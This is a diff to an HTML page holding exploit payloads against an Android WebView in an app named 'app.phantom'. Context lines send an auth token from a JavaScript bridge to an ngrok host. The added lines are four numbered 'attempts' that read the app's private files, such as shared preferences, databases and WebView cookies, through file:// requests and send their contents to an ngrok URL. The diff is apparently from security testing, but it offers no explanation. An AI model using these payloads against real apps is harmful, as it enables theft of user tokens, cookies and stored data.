@@ -44,8 +44,7 @@
         location.href = "https://https://7d15-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?leaked_token=" + RNCWebViewManager.JAVASCRIPT_INTERFACE.getAuthToken();
     </script>	
         
-//file access from file URIs
-	    
+//file access from file URIs - attempt#1
 	    <script type="text/javascript">
         function theftFile(path, callback) {
           var req = new XMLHttpRequest();
@@ -60,13 +59,91 @@
           req.send();
         }
 
-        var file = "/data/data/Android/app.phantom/databases/user.db";
-
+        var file = "/data/data/app.phantom/shared_prefs/com.google.android.gms.appid.xml";
         theftFile(file, function(contents) {
-            location.href = "https://7d15-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?data=" + encodeURIComponent(contents);
+            location.href = "https://7b45-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?data=" + encodeURIComponent(contents);
         });
     </script>
- 
+
+	    //file access from file URIs - attempt#2
+	    <script type="text/javascript">
+        function theftFile(path, callback) {
+          var req = new XMLHttpRequest();
+
+          req.open("GET", "file://" + path, true);
+          req.onload = function(e) {
+            callback(req.responseText);
+          }
+          req.onerror = function(e) {
+            callback(null);
+          }
+          req.send();
+        }
+
+        var file = "/data/data/Android/app.phantom/databases/";
+        theftFile(file, function(contents) {
+            location.href = "https://7b45-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?data=" + encodeURIComponent(contents);
+        });
+    </script>
+	    
+//file access from file URIs - attempt#3
+	    <script type="text/javascript">
+        function theftFile(path, callback) {
+          var req = new XMLHttpRequest();
+
+          req.open("GET", "file://" + path, true);
+          req.onload = function(e) {
+            callback(req.responseText);
+          }
+          req.onerror = function(e) {
+            callback(null);
+          }
+          req.send();
+        }
+
+        var file = "/data/data/app.phantom/webview/Cookies";
+        theftFile(file, function(contents) {
+            location.href = "https://7b45-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?data=" + encodeURIComponent(contents);
+        });
+    </script>	
+	    
+	    
+//file access from file URIs - attempt#4
+	    <script type="text/javascript">
+        function theftFile(path, callback) {
+          var req = new XMLHttpRequest();
+
+          req.open("GET", "file://" + path, true);
+          req.onload = function(e) {
+            callback(req.responseText);
+          }
+          req.onerror = function(e) {
+            callback(null);
+          }
+          req.send();
+        }
+
+        var file = "/data/data/Android/app.phantom/files/databases/database.db";
+        theftFile(file, function(contents) {
+            location.href = "https://7b45-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?data=" + encodeURIComponent(contents);
+        });
+    </script>	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
 	    
     </body>
 </html>
